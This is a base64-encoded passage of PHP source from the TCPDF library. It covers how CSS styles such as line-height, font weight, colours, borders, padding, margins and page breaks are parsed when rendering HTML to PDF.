bVska2V5XVsnc3R5bGUnXVsnbGV0dGVyLXNwYWNpbmcnXSkpIHsKCQkJCQkJCSRkb21bJGtleV1bJ2xldHRlci1zcGFjaW5nJ10gPSAkdGhpcy0+Z2V0Q1NTRm9udFNwYWNpbmcoJGRvbVska2V5XVsnc3R5bGUnXVsnbGV0dGVyLXNwYWNpbmcnXSwgJGRvbVskcGFyZW50a2V5XVsnbGV0dGVyLXNwYWNpbmcnXSk7CgkJCQkJCX0KCQkJCQkJLy8gbGluZS1oZWlnaHQgKGludGVybmFsbHkgaXMgdGhlIGNlbGwgaGVpZ2h0IHJhdGlvKQoJCQkJCQlpZiAoaXNzZXQoJGRvbVska2V5XVsnc3R5bGUnXVsnbGluZS1oZWlnaHQnXSkpIHsKCQkJCQkJCSRsaW5laGVpZ2h0ID0gdHJpbSgkZG9tWyRrZXldWydzdHlsZSddWydsaW5lLWhlaWdodCddKTsKCQkJCQkJCXN3aXRjaCAoJGxpbmVoZWlnaHQpIHsKCQkJCQkJCQkvLyBBIG5vcm1hbCBsaW5lIGhlaWdodC4gVGhpcyBpcyBkZWZhdWx0CgkJCQkJCQkJY2FzZSAnbm9ybWFsJzogewoJCQkJCQkJCQkkZG9tWyRrZXldWydsaW5lLWhlaWdodCddID0gJGRvbVswXVsnbGluZS1oZWlnaHQnXTsKCQkJCQkJCQkJYnJlYWs7CgkJCQkJCQkJfQoJCQkJCQkJCWNhc2UgJ2luaGVyaXQnOiB7CgkJCQkJCQkJCSRkb21bJGtleV1bJ2xpbmUtaGVpZ2h0J10gPSAkZG9tWyRwYXJlbnRrZXldWydsaW5lLWhlaWdodCddOwoJCQkJCQkJCX0KCQkJCQkJCQlkZWZhdWx0OiB7CgkJCQkJCQkJCWlmIChpc19udW1lcmljKCRsaW5laGVpZ2h0KSkgewoJCQkJCQkJCQkJLy8gY29udmVydCB0byBwZXJjZW50YWdlIG9mIGZvbnQgaGVpZ2h0CgkJCQkJCQkJCQkkbGluZWhlaWdodCA9ICgkbGluZWhlaWdodCAqIDEwMCkuJyUnOwoJCQkJCQkJCQl9CgkJCQkJCQkJCSRkb21bJGtleV1bJ2xpbmUtaGVpZ2h0J10gPSAkdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCRsaW5laGVpZ2h0LCAxLCAnJScsIHRydWUpOwoJCQkJCQkJCQlpZiAoc3Vic3RyKCRsaW5laGVpZ2h0LCAtMSkgIT09ICclJykgewoJCQkJCQkJCQkJaWYgKCRkb21bJGtleV1bJ2ZvbnRzaXplJ10gPD0gMCkgewoJCQkJCQkJCQkJCSRkb21bJGtleV1bJ2xpbmUtaGVpZ2h0J10gPSAxOwoJCQkJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkJCQkkZG9tWyRrZXldWydsaW5lLWhlaWdodCddID0gKCgkZG9tWyRrZXldWydsaW5lLWhlaWdodCddIC0gJHRoaXMtPmNlbGxfcGFkZGluZ1snVCddIC0gJHRoaXMtPmNlbGxfcGFkZGluZ1snQiddKSAvICRkb21bJGtleV1bJ2ZvbnRzaXplJ10pOwoJCQkJCQkJCQkJfQoJCQkJCQkJCQl9CgkJCQkJCQkJfQoJCQkJCQkJfQoJCQkJCQl9CgkJCQkJCS8vIGZvbnQgc3R5bGUKCQkJCQkJaWYgKGlzc2V0KCRkb21bJGtleV1bJ3N0eWxlJ11bJ2ZvbnQtd2VpZ2h0J10pKSB7CgkJCQkJCQlpZiAoc3RydG9sb3dlcigkZG9tWyRrZXldWydzdHlsZSddWydmb250LXdlaWdodCddWzBdKSA9PSAnbicpIHsKCQkJCQkJCQlpZiAoc3RycG9zKCRkb21bJGtleV1bJ2ZvbnRzdHlsZSddLCAnQicpICE9PSBmYWxzZSkgewoJCQkJCQkJCQkkZG9tWyRrZXldWydmb250c3R5bGUnXSA9IHN0cl9yZXBsYWNlKCdCJywgJycsICRkb21bJGtleV1bJ2ZvbnRzdHlsZSddKTsKCQkJCQkJCQl9CgkJCQkJCQl9IGVsc2VpZiAoc3RydG9sb3dlcigkZG9tWyRrZXldWydzdHlsZSddWydmb250LXdlaWdodCddWzBdKSA9PSAnYicpIHsKCQkJCQkJCQkkZG9tWyRrZXldWydmb250c3R5bGUnXSAuPSAnQic7CgkJCQkJCQl9CgkJCQkJCX0KCQkJCQkJaWYgKGlzc2V0KCRkb21bJGtleV1bJ3N0eWxlJ11bJ2ZvbnQtc3R5bGUnXSkgQU5EIChzdHJ0b2xvd2VyKCRkb21bJGtleV1bJ3N0eWxlJ11bJ2ZvbnQtc3R5bGUnXVswXSkgPT0gJ2knKSkgewoJCQkJCQkJJGRvbVska2V5XVsnZm9udHN0eWxlJ10gLj0gJ0knOwoJCQkJCQl9CgkJCQkJCS8vIGZvbnQgY29sb3IKCQkJCQkJaWYgKGlzc2V0KCRkb21bJGtleV1bJ3N0eWxlJ11bJ2NvbG9yJ10pIEFORCAoIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRkb21bJGtleV1bJ3N0eWxlJ11bJ2NvbG9yJ10pKSkgewoJCQkJCQkJJGRvbVska2V5XVsnZmdjb2xvciddID0gVENQREZfQ09MT1JTOjpjb252ZXJ0SFRNTENvbG9yVG9EZWMoJGRvbVska2V5XVsnc3R5bGUnXVsnY29sb3InXSwgJHRoaXMtPnNwb3RfY29sb3JzKTsKCQkJCQkJfSBlbHNlaWYgKCRkb21bJGtleV1bJ3ZhbHVlJ10gPT0gJ2EnKSB7CgkJCQkJCQkkZG9tWyRrZXldWydmZ2NvbG9yJ10gPSAkdGhpcy0+aHRtbExpbmtDb2xvckFycmF5OwoJCQkJCQl9CgkJCQkJCS8vIGJhY2tncm91bmQgY29sb3IKCQkJCQkJaWYgKGlzc2V0KCRkb21bJGtleV1bJ3N0eWxlJ11bJ2JhY2tncm91bmQtY29sb3InXSkgQU5EICghVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJGRvbVska2V5XVsnc3R5bGUnXVsnYmFja2dyb3VuZC1jb2xvciddKSkpIHsKCQkJCQkJCSRkb21bJGtleV1bJ2JnY29sb3InXSA9IFRDUERGX0NPTE9SUzo6Y29udmVydEhUTUxDb2xvclRvRGVjKCRkb21bJGtleV1bJ3N0eWxlJ11bJ2JhY2tncm91bmQtY29sb3InXSwgJHRoaXMtPnNwb3RfY29sb3JzKTsKCQkJCQkJfQoJCQkJCQkvLyB0ZXh0LWRlY29yYXRpb24KCQkJCQkJaWYgKGlzc2V0KCRkb21bJGtleV1bJ3N0eWxlJ11bJ3RleHQtZGVjb3JhdGlvbiddKSkgewoJCQkJCQkJJGRlY29ycyA9IGV4cGxvZGUoJyAnLCBzdHJ0b2xvd2VyKCRkb21bJGtleV1bJ3N0eWxlJ11bJ3RleHQtZGVjb3JhdGlvbiddKSk7CgkJCQkJCQlmb3JlYWNoICgkZGVjb3JzIGFzICRkZWMpIHsKCQkJCQkJCQkkZGVjID0gdHJpbSgkZGVjKTsKCQkJCQkJCQlpZiAoIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRkZWMpKSB7CgkJCQkJCQkJCWlmICgkZGVjWzBdID09ICd1JykgewoJCQkJCQkJCQkJLy8gdW5kZXJsaW5lCgkJCQkJCQkJCQkkZG9tWyRrZXldWydmb250c3R5bGUnXSAuPSAnVSc7CgkJCQkJCQkJCX0gZWxzZWlmICgkZGVjWzBdID09ICdsJykgewoJCQkJCQkJCQkJLy8gbGluZS10aHJvdWdoCgkJCQkJCQkJCQkkZG9tWyRrZXldWydmb250c3R5bGUnXSAuPSAnRCc7CgkJCQkJCQkJCX0gZWxzZWlmICgkZGVjWzBdID09ICdvJykgewoJCQkJCQkJCQkJLy8gb3ZlcmxpbmUKCQkJCQkJCQkJCSRkb21bJGtleV1bJ2ZvbnRzdHlsZSddIC49ICdPJzsKCQkJCQkJCQkJfQoJCQkJCQkJCX0KCQkJCQkJCX0KCQkJCQkJfSBlbHNlaWYgKCRkb21bJGtleV1bJ3ZhbHVlJ10gPT0gJ2EnKSB7CgkJCQkJCQkkZG9tWyRrZXldWydmb250c3R5bGUnXSA9ICR0aGlzLT5odG1sTGlua0ZvbnRTdHlsZTsKCQkJCQkJfQoJCQkJCQkvLyBjaGVjayBmb3Igd2lkdGggYXR0cmlidXRlCgkJCQkJCWlmIChpc3NldCgkZG9tWyRrZXldWydzdHlsZSddWyd3aWR0aCddKSkgewoJCQkJCQkJJGRvbVska2V5XVsnd2lkdGgnXSA9ICRkb21bJGtleV1bJ3N0eWxlJ11bJ3dpZHRoJ107CgkJCQkJCX0KCQkJCQkJLy8gY2hlY2sgZm9yIGhlaWdodCBhdHRyaWJ1dGUKCQkJCQkJaWYgKGlzc2V0KCRkb21bJGtleV1bJ3N0eWxlJ11bJ2hlaWdodCddKSkgewoJCQkJCQkJJGRvbVska2V5XVsnaGVpZ2h0J10gPSAkZG9tWyRrZXldWydzdHlsZSddWydoZWlnaHQnXTsKCQkJCQkJfQoJCQkJCQkvLyBjaGVjayBmb3IgdGV4dCBhbGlnbm1lbnQKCQkJCQkJaWYgKGlzc2V0KCRkb21bJGtleV1bJ3N0eWxlJ11bJ3RleHQtYWxpZ24nXSkpIHsKCQkJCQkJCSRkb21bJGtleV1bJ2FsaWduJ10gPSBzdHJ0b3VwcGVyKCRkb21bJGtleV1bJ3N0eWxlJ11bJ3RleHQtYWxpZ24nXVswXSk7CgkJCQkJCX0KCQkJCQkJLy8gY2hlY2sgZm9yIENTUyBib3JkZXIgcHJvcGVydGllcwoJCQkJCQlpZiAoaXNzZXQoJGRvbVska2V5XVsnc3R5bGUnXVsnYm9yZGVyJ10pKSB7CgkJCQkJCQkkYm9yZGVyc3R5bGUgPSAkdGhpcy0+Z2V0Q1NTQm9yZGVyU3R5bGUoJGRvbVska2V5XVsnc3R5bGUnXVsnYm9yZGVyJ10pOwoJCQkJCQkJaWYgKCFlbXB0eSgkYm9yZGVyc3R5bGUpKSB7CgkJCQkJCQkJJGRvbVska2V5XVsnYm9yZGVyJ11bJ0xUUkInXSA9ICRib3JkZXJzdHlsZTsKCQkJCQkJCX0KCQkJCQkJfQoJCQkJCQlpZiAoaXNzZXQoJGRvbVska2V5XVsnc3R5bGUnXVsnYm9yZGVyLWNvbG9yJ10pKSB7CgkJCQkJCQkkYnJkX2NvbG9ycyA9IHByZWdfc3BsaXQoJy9bXHNdKy8nLCB0cmltKCRkb21bJGtleV1bJ3N0eWxlJ11bJ2JvcmRlci1jb2xvciddKSk7CgkJCQkJCQlpZiAoaXNzZXQoJGJyZF9jb2xvcnNbM10pKSB7CgkJCQkJCQkJJGRvbVska2V5XVsnYm9yZGVyJ11bJ0wnXVsnY29sb3InXSA9IFRDUERGX0NPTE9SUzo6Y29udmVydEhUTUxDb2xvclRvRGVjKCRicmRfY29sb3JzWzNdLCAkdGhpcy0+c3BvdF9jb2xvcnMpOwoJCQkJCQkJfQoJCQkJCQkJaWYgKGlzc2V0KCRicmRfY29sb3JzWzFdKSkgewoJCQkJCQkJCSRkb21bJGtleV1bJ2JvcmRlciddWydSJ11bJ2NvbG9yJ10gPSBUQ1BERl9DT0xPUlM6OmNvbnZlcnRIVE1MQ29sb3JUb0RlYygkYnJkX2NvbG9yc1sxXSwgJHRoaXMtPnNwb3RfY29sb3JzKTsKCQkJCQkJCX0KCQkJCQkJCWlmIChpc3NldCgkYnJkX2NvbG9yc1swXSkpIHsKCQkJCQkJCQkkZG9tWyRrZXldWydib3JkZXInXVsnVCddWydjb2xvciddID0gVENQREZfQ09MT1JTOjpjb252ZXJ0SFRNTENvbG9yVG9EZWMoJGJyZF9jb2xvcnNbMF0sICR0aGlzLT5zcG90X2NvbG9ycyk7CgkJCQkJCQl9CgkJCQkJCQlpZiAoaXNzZXQoJGJyZF9jb2xvcnNbMl0pKSB7CgkJCQkJCQkJJGRvbVska2V5XVsnYm9yZGVyJ11bJ0InXVsnY29sb3InXSA9IFRDUERGX0NPTE9SUzo6Y29udmVydEhUTUxDb2xvclRvRGVjKCRicmRfY29sb3JzWzJdLCAkdGhpcy0+c3BvdF9jb2xvcnMpOwoJCQkJCQkJfQoJCQkJCQl9CgkJCQkJCWlmIChpc3NldCgkZG9tWyRrZXldWydzdHlsZSddWydib3JkZXItd2lkdGgnXSkpIHsKCQkJCQkJCSRicmRfd2lkdGhzID0gcHJlZ19zcGxpdCgnL1tcc10rLycsIHRyaW0oJGRvbVska2V5XVsnc3R5bGUnXVsnYm9yZGVyLXdpZHRoJ10pKTsKCQkJCQkJCWlmIChpc3NldCgkYnJkX3dpZHRoc1szXSkpIHsKCQkJCQkJCQkkZG9tWyRrZXldWydib3JkZXInXVsnTCddWyd3aWR0aCddID0gJHRoaXMtPmdldENTU0JvcmRlcldpZHRoKCRicmRfd2lkdGhzWzNdKTsKCQkJCQkJCX0KCQkJCQkJCWlmIChpc3NldCgkYnJkX3dpZHRoc1sxXSkpIHsKCQkJCQkJCQkkZG9tWyRrZXldWydib3JkZXInXVsnUiddWyd3aWR0aCddID0gJHRoaXMtPmdldENTU0JvcmRlcldpZHRoKCRicmRfd2lkdGhzWzFdKTsKCQkJCQkJCX0KCQkJCQkJCWlmIChpc3NldCgkYnJkX3dpZHRoc1swXSkpIHsKCQkJCQkJCQkkZG9tWyRrZXldWydib3JkZXInXVsnVCddWyd3aWR0aCddID0gJHRoaXMtPmdldENTU0JvcmRlcldpZHRoKCRicmRfd2lkdGhzWzBdKTsKCQkJCQkJCX0KCQkJCQkJCWlmIChpc3NldCgkYnJkX3dpZHRoc1syXSkpIHsKCQkJCQkJCQkkZG9tWyRrZXldWydib3JkZXInXVsnQiddWyd3aWR0aCddID0gJHRoaXMtPmdldENTU0JvcmRlcldpZHRoKCRicmRfd2lkdGhzWzJdKTsKCQkJCQkJCX0KCQkJCQkJfQoJCQkJCQlpZiAoaXNzZXQoJGRvbVska2V5XVsnc3R5bGUnXVsnYm9yZGVyLXN0eWxlJ10pKSB7CgkJCQkJCQkkYnJkX3N0eWxlcyA9IHByZWdfc3BsaXQoJy9bXHNdKy8nLCB0cmltKCRkb21bJGtleV1bJ3N0eWxlJ11bJ2JvcmRlci1zdHlsZSddKSk7CgkJCQkJCQlpZiAoaXNzZXQoJGJyZF9zdHlsZXNbM10pIEFORCAoJGJyZF9zdHlsZXNbM10hPSdub25lJykpIHsKCQkJCQkJCQkkZG9tWyRrZXldWydib3JkZXInXVsnTCddWydjYXAnXSA9ICdzcXVhcmUnOwoJCQkJCQkJCSRkb21bJGtleV1bJ2JvcmRlciddWydMJ11bJ2pvaW4nXSA9ICdtaXRlcic7CgkJCQkJCQkJJGRvbVska2V5XVsnYm9yZGVyJ11bJ0wnXVsnZGFzaCddID0gJHRoaXMtPmdldENTU0JvcmRlckRhc2hTdHlsZSgkYnJkX3N0eWxlc1szXSk7CgkJCQkJCQkJaWYgKCRkb21bJGtleV1bJ2JvcmRlciddWydMJ11bJ2Rhc2gnXSA8IDApIHsKCQkJCQkJCQkJJGRvbVska2V5XVsnYm9yZGVyJ11bJ0wnXSA9IGFycmF5KCk7CgkJCQkJCQkJfQoJCQkJCQkJfQoJCQkJCQkJaWYgKGlzc2V0KCRicmRfc3R5bGVzWzFdKSkgewoJCQkJCQkJCSRkb21bJGtleV1bJ2JvcmRlciddWydSJ11bJ2NhcCddID0gJ3NxdWFyZSc7CgkJCQkJCQkJJGRvbVska2V5XVsnYm9yZGVyJ11bJ1InXVsnam9pbiddID0gJ21pdGVyJzsKCQkJCQkJCQkkZG9tWyRrZXldWydib3JkZXInXVsnUiddWydkYXNoJ10gPSAkdGhpcy0+Z2V0Q1NTQm9yZGVyRGFzaFN0eWxlKCRicmRfc3R5bGVzWzFdKTsKCQkJCQkJCQlpZiAoJGRvbVska2V5XVsnYm9yZGVyJ11bJ1InXVsnZGFzaCddIDwgMCkgewoJCQkJCQkJCQkkZG9tWyRrZXldWydib3JkZXInXVsnUiddID0gYXJyYXkoKTsKCQkJCQkJCQl9CgkJCQkJCQl9CgkJCQkJCQlpZiAoaXNzZXQoJGJyZF9zdHlsZXNbMF0pKSB7CgkJCQkJCQkJJGRvbVska2V5XVsnYm9yZGVyJ11bJ1QnXVsnY2FwJ10gPSAnc3F1YXJlJzsKCQkJCQkJCQkkZG9tWyRrZXldWydib3JkZXInXVsnVCddWydqb2luJ10gPSAnbWl0ZXInOwoJCQkJCQkJCSRkb21bJGtleV1bJ2JvcmRlciddWydUJ11bJ2Rhc2gnXSA9ICR0aGlzLT5nZXRDU1NCb3JkZXJEYXNoU3R5bGUoJGJyZF9zdHlsZXNbMF0pOwoJCQkJCQkJCWlmICgkZG9tWyRrZXldWydib3JkZXInXVsnVCddWydkYXNoJ10gPCAwKSB7CgkJCQkJCQkJCSRkb21bJGtleV1bJ2JvcmRlciddWydUJ10gPSBhcnJheSgpOwoJCQkJCQkJCX0KCQkJCQkJCX0KCQkJCQkJCWlmIChpc3NldCgkYnJkX3N0eWxlc1syXSkpIHsKCQkJCQkJCQkkZG9tWyRrZXldWydib3JkZXInXVsnQiddWydjYXAnXSA9ICdzcXVhcmUnOwoJCQkJCQkJCSRkb21bJGtleV1bJ2JvcmRlciddWydCJ11bJ2pvaW4nXSA9ICdtaXRlcic7CgkJCQkJCQkJJGRvbVska2V5XVsnYm9yZGVyJ11bJ0InXVsnZGFzaCddID0gJHRoaXMtPmdldENTU0JvcmRlckRhc2hTdHlsZSgkYnJkX3N0eWxlc1syXSk7CgkJCQkJCQkJaWYgKCRkb21bJGtleV1bJ2JvcmRlciddWydCJ11bJ2Rhc2gnXSA8IDApIHsKCQkJCQkJCQkJJGRvbVska2V5XVsnYm9yZGVyJ11bJ0InXSA9IGFycmF5KCk7CgkJCQkJCQkJfQoJCQkJCQkJfQoJCQkJCQl9CgkJCQkJCSRjZWxsc2lkZSA9IGFycmF5KCdMJyA9PiAnbGVmdCcsICdSJyA9PiAncmlnaHQnLCAnVCcgPT4gJ3RvcCcsICdCJyA9PiAnYm90dG9tJyk7CgkJCQkJCWZvcmVhY2ggKCRjZWxsc2lkZSBhcyAkYnNrID0+ICRic3YpIHsKCQkJCQkJCWlmIChpc3NldCgkZG9tWyRrZXldWydzdHlsZSddWydib3JkZXItJy4kYnN2XSkpIHsKCQkJCQkJCQkkYm9yZGVyc3R5bGUgPSAkdGhpcy0+Z2V0Q1NTQm9yZGVyU3R5bGUoJGRvbVska2V5XVsnc3R5bGUnXVsnYm9yZGVyLScuJGJzdl0pOwoJCQkJCQkJCWlmICghZW1wdHkoJGJvcmRlcnN0eWxlKSkgewoJCQkJCQkJCQkkZG9tWyRrZXldWydib3JkZXInXVskYnNrXSA9ICRib3JkZXJzdHlsZTsKCQkJCQkJCQl9CgkJCQkJCQl9CgkJCQkJCQlpZiAoaXNzZXQoJGRvbVska2V5XVsnc3R5bGUnXVsnYm9yZGVyLScuJGJzdi4nLWNvbG9yJ10pKSB7CgkJCQkJCQkJJGRvbVska2V5XVsnYm9yZGVyJ11bJGJza11bJ2NvbG9yJ10gPSBUQ1BERl9DT0xPUlM6OmNvbnZlcnRIVE1MQ29sb3JUb0RlYygkZG9tWyRrZXldWydzdHlsZSddWydib3JkZXItJy4kYnN2LictY29sb3InXSwgJHRoaXMtPnNwb3RfY29sb3JzKTsKCQkJCQkJCX0KCQkJCQkJCWlmIChpc3NldCgkZG9tWyRrZXldWydzdHlsZSddWydib3JkZXItJy4kYnN2Lictd2lkdGgnXSkpIHsKCQkJCQkJCQkkZG9tWyRrZXldWydib3JkZXInXVskYnNrXVsnd2lkdGgnXSA9ICR0aGlzLT5nZXRDU1NCb3JkZXJXaWR0aCgkZG9tWyRrZXldWydzdHlsZSddWydib3JkZXItJy4kYnN2Lictd2lkdGgnXSk7CgkJCQkJCQl9CgkJCQkJCQlpZiAoaXNzZXQoJGRvbVska2V5XVsnc3R5bGUnXVsnYm9yZGVyLScuJGJzdi4nLXN0eWxlJ10pKSB7CgkJCQkJCQkJJGRvbVska2V5XVsnYm9yZGVyJ11bJGJza11bJ2Rhc2gnXSA9ICR0aGlzLT5nZXRDU1NCb3JkZXJEYXNoU3R5bGUoJGRvbVska2V5XVsnc3R5bGUnXVsnYm9yZGVyLScuJGJzdi4nLXN0eWxlJ10pOwoJCQkJCQkJCWlmICgkZG9tWyRrZXldWydib3JkZXInXVskYnNrXVsnZGFzaCddIDwgMCkgewoJCQkJCQkJCQkkZG9tWyRrZXldWydib3JkZXInXVskYnNrXSA9IGFycmF5KCk7CgkJCQkJCQkJfQoJCQkJCQkJfQoJCQkJCQl9CgkJCQkJCS8vIGNoZWNrIGZvciBDU1MgcGFkZGluZyBwcm9wZXJ0aWVzCgkJCQkJCWlmIChpc3NldCgkZG9tWyRrZXldWydzdHlsZSddWydwYWRkaW5nJ10pKSB7CgkJCQkJCQkkZG9tWyRrZXldWydwYWRkaW5nJ10gPSAkdGhpcy0+Z2V0Q1NTUGFkZGluZygkZG9tWyRrZXldWydzdHlsZSddWydwYWRkaW5nJ10pOwoJCQkJCQl9IGVsc2UgewoJCQkJCQkJJGRvbVska2V5XVsncGFkZGluZyddID0gJHRoaXMtPmNlbGxfcGFkZGluZzsKCQkJCQkJfQoJCQkJCQlmb3JlYWNoICgkY2VsbHNpZGUgYXMgJHBzayA9PiAkcHN2KSB7CgkJCQkJCQlpZiAoaXNzZXQoJGRvbVska2V5XVsnc3R5bGUnXVsncGFkZGluZy0nLiRwc3ZdKSkgewoJCQkJCQkJCSRkb21bJGtleV1bJ3BhZGRpbmcnXVskcHNrXSA9ICR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJGRvbVska2V5XVsnc3R5bGUnXVsncGFkZGluZy0nLiRwc3ZdLCAwLCAncHgnLCBmYWxzZSk7CgkJCQkJCQl9CgkJCQkJCX0KCQkJCQkJLy8gY2hlY2sgZm9yIENTUyBtYXJnaW4gcHJvcGVydGllcwoJCQkJCQlpZiAoaXNzZXQoJGRvbVska2V5XVsnc3R5bGUnXVsnbWFyZ2luJ10pKSB7CgkJCQkJCQkkZG9tWyRrZXldWydtYXJnaW4nXSA9ICR0aGlzLT5nZXRDU1NNYXJnaW4oJGRvbVska2V5XVsnc3R5bGUnXVsnbWFyZ2luJ10pOwoJCQkJCQl9IGVsc2UgewoJCQkJCQkJJGRvbVska2V5XVsnbWFyZ2luJ10gPSAkdGhpcy0+Y2VsbF9tYXJnaW47CgkJCQkJCX0KCQkJCQkJZm9yZWFjaCAoJGNlbGxzaWRlIGFzICRwc2sgPT4gJHBzdikgewoJCQkJCQkJaWYgKGlzc2V0KCRkb21bJGtleV1bJ3N0eWxlJ11bJ21hcmdpbi0nLiRwc3ZdKSkgewoJCQkJCQkJCSRkb21bJGtleV1bJ21hcmdpbiddWyRwc2tdID0gJHRoaXMtPmdldEhUTUxVbml0VG9Vbml0cyhzdHJfcmVwbGFjZSgnYXV0bycsICcwJywgJGRvbVska2V5XVsnc3R5bGUnXVsnbWFyZ2luLScuJHBzdl0pLCAwLCAncHgnLCBmYWxzZSk7CgkJCQkJCQl9CgkJCQkJCX0KCQkJCQkJLy8gY2hlY2sgZm9yIENTUyBib3JkZXItc3BhY2luZyBwcm9wZXJ0aWVzCgkJCQkJCWlmIChpc3NldCgkZG9tWyRrZXldWydzdHlsZSddWydib3JkZXItc3BhY2luZyddKSkgewoJCQkJCQkJJGRvbVska2V5XVsnYm9yZGVyLXNwYWNpbmcnXSA9ICR0aGlzLT5nZXRDU1NCb3JkZXJNYXJnaW4oJGRvbVska2V5XVsnc3R5bGUnXVsnYm9yZGVyLXNwYWNpbmcnXSk7CgkJCQkJCX0KCQkJCQkJLy8gcGFnZS1icmVhay1pbnNpZGUKCQkJCQkJaWYgKGlzc2V0KCRkb21bJGtleV1bJ3N0eWxlJ11bJ3BhZ2UtYnJlYWstaW5zaWRlJ10pIEFORCAoJGRvbVska2V5XVsnc3R5bGUnXVsncGFnZS1icmVhay1pbnNpZGUnXSA9PSAnYXZvaWQnKSkgewoJCQkJCQkJJGRvbVska2V5XVsnYXR0cmlidXRlJ11bJ25vYnInXSA9ICd0cnVlJzsKCQkJCQkJfQoJCQkJCQkvLyBwYWdlLWJyZWFrLWJlZm9yZQoJCQkJCQlpZiAoaXNzZXQoJGRvbVska2V5XVsnc3R5bGUnXVsncGFnZS1icmVhay1iZWZvcmUnXSkpIHsKCQkJCQkJCWlmICgkZG9tWyRrZXldWydzdHlsZSddWydwYWdlLWJyZWFrLWJlZm9yZSddID09ICdhbHdheXMnKSB7CgkJCQkJCQkJJGRvbVska2V5XVsnYXR0cmlidXRlJ11bJ3BhZ2VicmVhayddID0gJ3RydWUnOwoJCQkJCQkJfSBlbHNlaWYgKCRkb21bJGtleV1bJ3N0eWxlJ11bJ3BhZ2UtYnJlYWstYmVmb3JlJ10gPT0gJ2xlZnQnKSB7CgkJCQkJCQkJJGRvbVska2V5XVsnYXR0cmlidXRlJ11bJ3BhZ2VicmVhayddID0gJ2xlZnQnOwoJCQkJCQkJfSBlbHNlaWYgKCRkb21bJGtleV1bJ3N0eWxlJ11bJ3BhZ2UtYnJlYWstYmVmb3JlJ10gPT0gJ3JpZ2h0JykgewoJCQkJCQkJCSRkb21bJGtleV1bJ2F0dHJpYnV0ZSddWydwYWdlYnJlYWsnXSA9ICdyaWdodCc7CgkJCQkJCQl9CgkJCQkJCX0KCQkJCQkJLy8gcGFnZS1icmVhay1hZnRlcgoJCQkJCQlpZiAoaXNzZXQoJGRvbVska2V5XVsnc3R5bGUnXVsncGFnZS1icmVhay1hZnRlciddKSkgewoJCQkJCQkJaWYgKCRkb21bJGtleV1bJ3N0eWxlJ11bJ3BhZ2UtYnJlYWstYWZ0ZXInXSA9PSAnYWx3YXlzJykgewoJCQkJCQkJCSRkb21bJGtleV1bJ2F0dHJpYnV0ZSddWydwYWdlYnJlYWthZnRlciddID0gJ3RydWUnOwoJCQkJCQkJfSBlbHNlaWYgKCRkb21bJGtleV1bJ3N0eWxlJ11bJ3BhZ2UtYnJlYWstYWZ0ZXInXSA9PSAnbGVmdCcpIHsKCQkJCQkJCQkkZG9tWyRrZXldWydhdHRyaWJ1dGUnXVsncGFnZWJyZWFrYWZ0ZXInXSA9ICdsZWZ0JzsKCQkJCQkJCX0gZWxzZWlmICgkZG9tWyRrZXldWydzdHlsZSddWydwYWdlLWJyZWFrLWFmdGVyJ10gPT0gJ3JpZ2h0JykgewoJCQkJCQkJCSRkb21bJGtleV1bJ2F0dHJpYnV0ZSddWydwYWdlYnJlYWthZnRlciddID0gJ3JpZ2h0JzsKCQkJCQkJCX0KCQkJCQkJfQoJCQkJCX0KCQkJCQlpZiAoaXNzZXQoJGRvbVska2V5XVsnYXR0cmlidXRlJ11bJ2Rpc3BsYXknXSkpIHsKCQkJCQkJJGRvbVska2V5XVsnaGlkZSddID0gKHRyaW0oc3RydG9sb3dlcigkZG9tWyRrZXldWydhdHRyaWJ1dGUnXVsnZGlzcGxheSddKSkgPT0gJ25vbmUnKTsKCQkJCQl9CgkJCQkJaWYgKGlzc2V0KCRkb21bJGtleV1bJ2F0dHJpYnV0ZSddWydib3JkZXInXSkgQU5EICgkZG9tWyRrZXldWydhdHRyaWJ1dGUnXVsnYm9yZGVyJ10gIT0gMCkpIHsKCQkJCQkJJGJvcmRlcnN0eWxlID0gJHRoaXMtPmdldENTU0JvcmRlclN0eWxlKCRkb21bJGtleV1bJ2F0dHJpYnV0ZSddWydib3JkZXInXS4nIHNvbGlkIGJsYWNrJyk7CgkJCQkJCWlmICghZW1wdHkoJGJvcmRlcnN0eWxlKSkgewoJCQkJCQkJJGRvbVska2V5XVsnYm9yZGVyJ11bJ0xUUkInXSA9ICRib3JkZXJzdHlsZTsKCQkJCQkJfQoJCQkJCX0KCQkJCQkvLyBjaGVjayBmb3IgZm9udCB0YWcKCQkJCQlpZiAoJGRvbVska2V5XVsndmFsdWUnXSA9PSAnZm9udCcpIHsKCQkJCQkJLy8gZm9udCBmYW1pbHkKCQkJCQkJaWYgKGlzc2V0KCRkb21bJGtleV1bJ2F0dHJpYnV0ZSddWydmYWNlJ10pKSB7CgkJCQkJCQkkZG9tWyRrZXldWydmb250bmFtZSddID0gJHRoaXMtPmdldEZvbnRGYW1pbHlOYW1lKCRkb21bJGtleV1bJ2F0dHJpYnV0ZSddWydmYWNlJ10pOwoJCQkJCQl9CgkJCQkJCS8vIGZvbnQgc2l6ZQoJCQkJCQlpZiAoaXNzZXQoJGRvbVska2V5XVsnYXR0cmlidXRlJ11bJ3NpemUnXSkpIHsKCQkJCQkJCWlmICgka2V5ID4gMCkgewoJCQkJCQkJCWlmICgkZG9tWyRrZXldWydhdHRyaWJ1dGUnXVsnc2l6ZSddWzBdID09ICcrJykgewoJCQkJCQkJCQkkZG9tWyRrZXldWydmb250c2l6ZSddID0gJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsnZm9udHNpemUnXSArIGludHZhbChzdWJzdHIoJGRvbVska2V5XVsnYXR0cmlidXRlJ11bJ3NpemUnXSwgMSkpOwoJCQkJCQkJCX0gZWxzZWlmICgkZG9tWyRrZXldWydhdHRyaWJ1dGUnXVsnc2l6ZSddWzBdID09ICctJykgewoJCQkJCQkJCQkkZG9tWyRrZXldWydmb250c2l6ZSddID0gJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsnZm9udHNpemUnXSAtIGludHZhbChzdWJzdHIoJGRvbVska2V5XVsnYXR0cmlidXRlJ11bJ3NpemUnXSwgMSkpOwoJCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJCSRkb21bJGtleV1bJ2ZvbnRzaXplJ10gPSBpbnR2YWwoJGRvbVska2V5XVsnYXR0cmlidXRlJ11bJ3NpemUnXSk7CgkJCQkJCQkJfQoJCQk